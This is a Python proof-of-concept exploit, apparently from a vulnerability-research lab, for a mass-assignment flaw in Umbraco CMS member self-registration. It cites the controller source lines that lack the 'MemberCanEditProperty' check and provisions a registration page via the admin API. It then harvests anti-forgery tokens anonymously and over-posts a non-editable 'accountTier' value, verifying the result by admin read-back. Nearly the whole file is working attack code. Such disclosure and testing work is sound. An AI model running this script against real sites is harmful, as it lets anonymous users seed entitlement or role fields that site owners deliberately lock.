#!/usr/bin/env python3
"""
VULN-008 — Member self-registration mass-assignment of non-member-editable properties

Vulnerable code (targets/Umbraco-CMS/src/Umbraco.Web.Website):
  * Controllers/UmbRegisterController.cs:156-160  — the property write loop filters ONLY by
        "value present" + "alias exists on the member type":
            foreach (MemberPropertyModel property in model.MemberProperties.Where(p => p.Value != null)
                         .Where(property => member.Properties.Contains(property.Alias)))
                member.Properties[property.Alias]?.SetValue(property.Value);
    There is NO IMemberType.MemberCanEditProperty(alias) gate.
  * contrast — Controllers/UmbProfileController.cs:142-150 — the profile-edit loop DOES enforce it:
            .Where(p => memberType?.MemberCanEditProperty(p.Alias) ?? false)

Class: Mass assignment / over-posting (CWE-915).

Flaw (plain English):
  A member type property flagged "Member can edit = false" is one the member is NOT allowed to
  set. The Edit-Profile surface controller honours that flag; the Register surface controller does
  not. The register form only *renders* editable fields, but the action binds the whole
  MemberProperties[] list, so an unauthenticated attacker who hand-crafts the POST (adding an
  entry for a NON-editable alias) has that value persisted at sign-up. Where a site stores an
  authorization/entitlement value on the member type that it deliberately does not let members
  edit (tier / role / isVerified / balance), the attacker seeds it during registration.

Exploitation idea (full end-to-end, headless):
  1. (admin) create a member type with a property `accountTier` whose Visibility.MemberCanEdit=false.
  2. (admin) create a template that renders the stock Register-Member form bound to that member type,
     attach it to a doc type, create+publish a page — i.e. stand up the exact public registration
     surface a real site exposes. This is the only way to obtain a valid `ufprt` (Data-Protection
     encrypted route token) + antiforgery token; they cannot be forged.
  3. (UNAUTHENTICATED) GET the page, harvest ufprt + antiforgery token, then POST a registration
     that ADDS registerModel.MemberProperties[0].Alias=accountTier + .Value=<secret> — a field the
     form never rendered and the member is not allowed to edit.
  4. (admin) read the created member back and show accountTier == the attacker-supplied secret.

A successful run proves: an anonymous registrant set a member-type property explicitly marked
non-member-editable, purely by over-posting — the MemberCanEditProperty gate that UmbProfileController
applies is absent from UmbRegisterController.
"""
import json
import os
import re
import sys
import time
import uuid

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
import _common as c

VID = "VULN-008"
HERE = os.path.dirname(os.path.abspath(__file__))
SRC = os.path.abspath(os.path.join(HERE, "..", "..", "..", "..", "targets", "Umbraco-CMS", "src"))
NONEDIT_ALIAS = "accountTier"


def read_src(rel, start, end):
    try:
        with open(os.path.join(SRC, rel), encoding="utf-8") as f:
            lines = f.readlines()
        return "".join(lines[start - 1:end]).rstrip()
    except Exception as e:  # pragma: no cover
        return f"<could not read {rel}: {e}>"


def find_inputs(html):
    """Return list of (name, value) for every <input> in the HTML, order-independent."""
    out = []
    for tag in re.findall(r"<input\b[^>]*>", html, re.IGNORECASE):
        n = re.search(r'\bname\s*=\s*"([^"]*)"', tag, re.IGNORECASE)
        v = re.search(r'\bvalue\s*=\s*"([^"]*)"', tag, re.IGNORECASE)
        if n:
            out.append((n.group(1), v.group(1) if v else ""))
    return out


# ---------------------------------------------------------------------------
# admin provisioning helpers (Management API)
# ---------------------------------------------------------------------------
def create_member_type_with_noneditable_prop(admin, alias, prop_alias):
    mt_id = str(uuid.uuid4())
    payload = {
        "id": mt_id,
        "alias": alias,
        "name": alias,
        "description": None,
        "icon": "icon-user",
        "allowedAsRoot": False,
        "variesByCulture": False,
        "variesBySegment": False,
        "collection": None,
        "isElement": False,
        "allowedInLibrary": False,
        "properties": [{
            "id": str(uuid.uuid4()),
            "container": None,
            "sortOrder": 0,
            "alias": prop_alias,
            "name": "Account Tier",
            "description": "Server-trusted entitlement; NOT member-editable",
            "dataType": {"id": c.TEXTSTRING_DATATYPE},
            "variesByCulture": False,
            "variesBySegment": False,
            "validation": {"mandatory": False, "mandatoryMessage": None, "regEx": None, "regExMessage": None},
            "appearance": {"labelOnTop": False},
            "isSensitive": False,
            "visibility": {"memberCanView": False, "memberCanEdit": False},  # <-- the whole point
        }],
        "containers": [],
        "compositions": [],
        "parent": None,
    }
    r = admin.post("/member-type", json=payload)
    if r.status_code not in (200, 201):
        raise RuntimeError(f"create member-type failed: HTTP {r.status_code} {r.text[:400]}")
    return mt_id


def create_template(admin, name, alias, content):
    tpl_id = str(uuid.uuid4())
    r = admin.post("/template", json={"id": tpl_id, "name": name, "alias": alias, "content": content})
    if r.status_code not in (200, 201):
        # id may be echoed only in Location
        raise RuntimeError(f"create template failed: HTTP {r.status_code} {r.text[:400]}")
    loc = r.headers.get("Location", "")
    if loc:
        tpl_id = loc.rstrip("/").split("/")[-1]
    return tpl_id


def create_doctype_with_template(admin, alias, name, template_id):
    dt_id = str(uuid.uuid4())
    payload = {
        "id": dt_id,
        "alias": alias,
        "name": name,
        "description": None,
        "icon": "icon-document",
        "allowedAsRoot": True,
        "variesByCulture": False,
        "variesBySegment": False,
        "collection": None,
        "isElement": False,
        "properties": [],
        "containers": [],
        "allowedTemplates": [{"id": template_id}],
        "defaultTemplate": {"id": template_id},
        "cleanup": {"preventCleanup": False, "keepAllVersionsNewerThanDays": None, "keepLatestVersionPerDayForDays": None},
        "allowedDocumentTypes": [],
        "compositions": [],
        "parent": None,
    }
    r = admin.post("/document-type", json=payload)
    if r.status_code not in (200, 201):
        raise RuntimeError(f"create doctype failed: HTTP {r.status_code} {r.text[:400]}")
    return dt_id


def create_and_publish_document(admin, doctype_id, template_id, name):
    doc_id = str(uuid.uuid4())
    payload = {
        "id": doc_id,
        "parent": None,
        "documentType": {"id": doctype_id},
        "template": {"id": template_id},
        "values": [],
        "variants": [{"culture": None, "segment": None, "name": name}],
    }
    r = admin.post("/document", json=payload)
    if r.status_code not in (200, 201):
        raise RuntimeError(f"create document failed: HTTP {r.status_code} {r.text[:400]}")
    r = admin.put(f"/document/{doc_id}/publish", json={"publishSchedules": [{"culture": None, "schedule": None}]})
    if r.status_code not in (200, 204):
        raise RuntimeError(f"publish failed: HTTP {r.status_code} {r.text[:400]}")
    return doc_id


def candidate_urls(admin, doc_id, doc_name):
    cands = []
    try:
        r = admin.get(f"/document/urls?id={doc_id}")
        if r.status_code == 200:
            def walk(o):
                if isinstance(o, dict):
                    for k, v in o.items():
                        if k.lower() == "url" and isinstance(v, str):
                            cands.append(v)
                        else:
                            walk(v)
                elif isinstance(o, list):
                    for v in o:
                        walk(v)
            walk(r.json())
    except Exception:
        pass
    # normalise to paths, add sensible fallbacks
    paths = []
    for u in cands:
        if u.startswith("http"):
            from urllib.parse import urlparse
            u = urlparse(u).path
        if u and u not in paths:
            paths.append(u)
    for extra in ("/", f"/{doc_name.lower()}", f"/{doc_name.lower()}/"):
        if extra not in paths:
            paths.append(extra)
    return paths


# ---------------------------------------------------------------------------
def main() -> int:
    c.banner(VID, "Member self-registration mass-assignment (MemberCanEditProperty not enforced)",
             "UmbRegisterController.cs:156-160 (no MemberCanEditProperty filter) vs UmbProfileController.cs:142-150")

    # ---- STATIC: prove the code asymmetry firsthand (holds regardless of dynamic reachability) ----
    reg = read_src("Umbraco.Web.Website/Controllers/UmbRegisterController.cs", 156, 160)
    prof = read_src("Umbraco.Web.Website/Controllers/UmbProfileController.cs", 142, 150)
    c.log("PROOF", "REGISTER loop (UmbRegisterController.cs:156-160) — filters by alias-exists only:")
    for ln in reg.splitlines():
        c.log("INFO", "  " + ln.strip())
    c.log("PROOF", "PROFILE loop (UmbProfileController.cs:142-150) — additionally enforces MemberCanEditProperty:")
    for ln in prof.splitlines():
        c.log("INFO", "  " + ln.strip())
    asym_ok = ("MemberCanEditProperty" not in reg) and ("MemberCanEditProperty" in prof)
    if asym_ok:
        c.log("PROOF", "asymmetry confirmed: register path omits the MemberCanEditProperty gate the profile path has")
    else:
        c.log("FAIL", "source asymmetry not as expected — aborting")
        return c.verdict(VID, "FAILED", "source asymmetry not confirmed")

    admin = c.admin_client()
    c.log("SETUP", "admin authenticated to Management API")

    suffix = c.rnd(4)
    mt_alias = f"auditMember{suffix}"
    injected = f"PWNED-premium-{c.rnd(6)}"     # random each run so we assert THIS run's value

    # ---- SETUP: member type w/ non-editable property ----
    create_member_type_with_noneditable_prop(admin, mt_alias, NONEDIT_ALIAS)
    c.log("SETUP", f"created member type '{mt_alias}' with property '{NONEDIT_ALIAS}' (Visibility.MemberCanEdit=FALSE)")

    # ---- SETUP: the public registration surface (template -> doctype -> published page) ----
    tpl_alias = f"auditReg{suffix}"
    tpl_content = f"""@inherits Umbraco.Cms.Web.Common.Views.UmbracoViewPage
@using Umbraco.Cms.Core
@using Umbraco.Cms.Core.Security
@using Umbraco.Cms.Web.Website.Controllers
@using Umbraco.Cms.Web.Website.Models
@using Umbraco.Extensions
@inject MemberModelBuilderFactory memberModelBuilderFactory;
@{{
    Layout = null;
    var registerModel = memberModelBuilderFactory
        .CreateRegisterModel()
        .WithMemberTypeAlias("{mt_alias}")
        .WithRedirectUrl(null)
        .WithCustomProperties(false)
        .WithAutomaticLogIn(false)
        .Build();
}}
<!DOCTYPE html>
<html><head><title>reg</title></head><body>
@using (Html.BeginUmbracoForm<UmbRegisterController>("HandleRegisterMember", new {{
        MemberTypeAlias = registerModel.MemberTypeAlias,
        UsernameIsEmail = registerModel.UsernameIsEmail,
        RedirectUrl = registerModel.RedirectUrl,
        AutomaticLogIn = registerModel.AutomaticLogIn }}))
{{
    <div><input asp-for="@registerModel.Name" /></div>
    <div><input asp-for="@registerModel.Email" /></div>
    <div><input asp-for="@registerModel.Password" /></div>
    <div><input asp-for="@registerModel.ConfirmPassword" /></div>
    <button type="submit">Register</button>
}}
</body></html>
"""
    tpl_id = create_template(admin, f"AuditReg {suffix}", tpl_alias, tpl_content)
    c.log("SETUP", f"created template '{tpl_alias}' rendering the Register-Member form for '{mt_alias}'")
    dt_id = create_doctype_with_template(admin, f"auditRegPage{suffix}", f"AuditRegPage {suffix}", tpl_id)
    doc_name = f"reg{suffix}"
    doc_id = create_and_publish_document(admin, dt_id, tpl_id, doc_name)
    c.log("SETUP", f"created + published root page '{doc_name}' ({doc_id}) using that template")

    urls = candidate_urls(admin, doc_id, doc_name)
    c.log("INFO", f"candidate front-end URLs: {urls}")

    # ---- ATTACK: unauthenticated registration that over-posts the non-editable property ----
    import requests
    anon = requests.Session()
    anon.headers["User-Agent"] = "Mozilla/5.0 (cvehunter VULN-008)"

    page_html, page_url = None, None
    for attempt in range(8):
        for u in urls:
            try:
                r = anon.get(f"{c.BASE_URL}{u}", timeout=20)
            except Exception:
                continue
            if r.status_code == 200 and "ufprt" in r.text:
                page_html, page_url = r.text, f"{c.BASE_URL}{u}"
                break
        if page_html:
            break
        time.sleep(1.5)  # published cache / routing may need a moment to warm

    req_http, resp_txt = "", ""
    attacker_email = f"attacker_{c.rnd(4)}@evil.invalid"
    pw = f"Str0ngAttackerPass_{c.rnd(4)}!"

    if not page_html:
        # front-end/template did not render — record and fall back to NEEDS_MANUAL (static proof stands)
        with open(os.path.join(HERE, "response.txt"), "w") as f:
            f.write("Front-end registration page did not render a form containing 'ufprt'.\n"
                    f"Tried URLs: {urls}\n"
                    "Static source asymmetry (register vs profile) IS confirmed above.\n")
        with open(os.path.join(HERE, "request.http"), "w") as f:
            f.write("# (dynamic step not reached — see notes.md checklist)\n")
        c.log("INFO", "public registration surface not reachable headlessly on this lab; static proof stands")
        return c.verdict(VID, "NEEDS_MANUAL",
                         "source asymmetry CONFIRMED; end-to-end registration POST not reachable headlessly (see notes.md)")

    c.log("STEP", f"unauthenticated: GET {page_url} -> 200 with a registration form (ufprt present)")

    # parse form action + all inputs
    m = re.search(r'<form\b[^>]*\baction\s*=\s*"([^"]*)"', page_html, re.IGNORECASE)
    action = m.group(1) if m else page_url
    if action.startswith("/"):
        action = f"{c.BASE_URL}{action}"
    elif not action.startswith("http"):
        action = page_url

    inputs = dict(find_inputs(page_html))
    ufprt = next((v for k, v in inputs.items() if k.lower() == "ufprt"), None)
    token_name = next((k for k in inputs if k.lower().endswith("requestverificationtoken")), None)
    name_field = next((k for k in inputs if k == "Name" or k.endswith(".Name")), None)
    prefix = name_field[:-len("Name")] if name_field else "registerModel."
    c.log("INFO", f"harvested ufprt ({'yes' if ufprt else 'no'}), antiforgery field '{token_name}', bind prefix '{prefix}'")

    # build the malicious POST: legit fields + the OVER-POSTED non-editable member property
    form = dict(inputs)  # carry ufprt + antiforgery token forward verbatim
    form[f"{prefix}Name"] = f"Attacker {suffix}"
    form[f"{prefix}Email"] = attacker_email
    form[f"{prefix}Password"] = pw
    form[f"{prefix}ConfirmPassword"] = pw
    form[f"{prefix}MemberProperties[0].Alias"] = NONEDIT_ALIAS      # <-- not rendered by the form
    form[f"{prefix}MemberProperties[0].Value"] = injected           # <-- attacker-controlled
    c.log("STEP", f"unauthenticated: POST registration for {attacker_email} with over-posted "
                  f"{prefix}MemberProperties[0].Alias={NONEDIT_ALIAS} = {injected!r}")

    rp = anon.post(action, data=form, allow_redirects=False, timeout=20)
    c.log("INFO", f"registration POST -> HTTP {rp.status_code}")
    if rp.status_code in (301, 302, 303, 307, 308):
        c.log("PROOF", "registration accepted (redirect to current page = RegisterMemberAsync succeeded)")
    elif rp.status_code == 200:
        # returned the page again => ModelState invalid; surface the errors
        errs = re.findall(r'text-danger[^>]*>([^<]+)<', rp.text)
        c.log("INFO", f"got 200 (form redisplayed); validation messages: {errs[:6]}")

    req_http = (
        f"# UNAUTHENTICATED member registration (over-posting a non-member-editable property)\n"
        f"POST {action} HTTP/1.1\n"
        f"Content-Type: application/x-www-form-urlencoded\n"
        f"Cookie: <antiforgery cookie from the GET>\n\n"
        f"{prefix}Name=Attacker+{suffix}&{prefix}Email={attacker_email}&{prefix}Password=<pw>&"
        f"{prefix}ConfirmPassword=<pw>&"
        f"{prefix}MemberProperties%5B0%5D.Alias={NONEDIT_ALIAS}&"
        f"{prefix}MemberProperties%5B0%5D.Value={injected}&"
        f"ufprt=<harvested>&{token_name}=<harvested>\n"
    )

    # ---- VERIFY (as admin): read the member back; assert the non-editable property was set ----
    time.sleep(1.0)
    member_id, leaked_val = None, None
    fr = admin.get(f"/filter/member?filter={attacker_email}&take=100")
    if fr.status_code == 200:
        for it in fr.json().get("items", []):
            if it.get("email", "").lower() == attacker_email.lower():
                member_id = it.get("id")
                break
    ok = False
    values_dump = "n/a"
    if member_id:
        c.log("STEP", f"admin read-back: GET /member/{member_id}")
        dr = admin.get(f"/member/{member_id}")
        if dr.status_code == 200:
            body = dr.json()
            values_dump = json.dumps(body.get("values", []), indent=2)
            for v in body.get("values", []):
                if v.get("alias") == NONEDIT_ALIAS:
                    leaked_val = v.get("value")
            if leaked_val == injected:
                ok = True
                c.log("PROOF", f"member '{attacker_email}' has {NONEDIT_ALIAS} = {leaked_val!r} — the EXACT attacker "
                               f"value, on a property flagged MemberCanEdit=FALSE (mass-assigned at registration)")
            else:
                c.log("INFO", f"member exists but {NONEDIT_ALIAS} = {leaked_val!r} (expected {injected!r})")
        else:
            c.log("INFO", f"read-back GET /member/{member_id} -> {dr.status_code}")
    else:
        c.log("INFO", f"member not found via filter (status {fr.status_code}) — registration may have failed")

    resp_txt = (
        f"unauthenticated GET {page_url} -> 200 (form with ufprt)\n"
        f"unauthenticated POST registration -> {rp.status_code}\n"
        f"attacker email: {attacker_email}\n"
        f"over-posted non-editable property: {NONEDIT_ALIAS} = {injected}\n"
        f"admin read-back member id: {member_id}\n"
        f"member values[] after registration:\n{values_dump}\n"
        f"=> {NONEDIT_ALIAS} persisted from attacker input: {ok}\n"
    )
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(req_http)
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(resp_txt)

    if ok:
        return c.verdict(VID, "CONFIRMED",
                         f"anon registrant set non-member-editable '{NONEDIT_ALIAS}' via over-posting "
                         f"(read back = attacker value)")
    if member_id and leaked_val is None:
        # member created, property not set: still shows registration works; but the mass-assign didn't land
        return c.verdict(VID, "FAILED",
                         f"member created but '{NONEDIT_ALIAS}' not persisted from the over-post")
    return c.verdict(VID, "NEEDS_MANUAL",
                     "source asymmetry CONFIRMED; dynamic registration did not complete cleanly (see response.txt)")


if __name__ == "__main__":
    sys.exit(main())
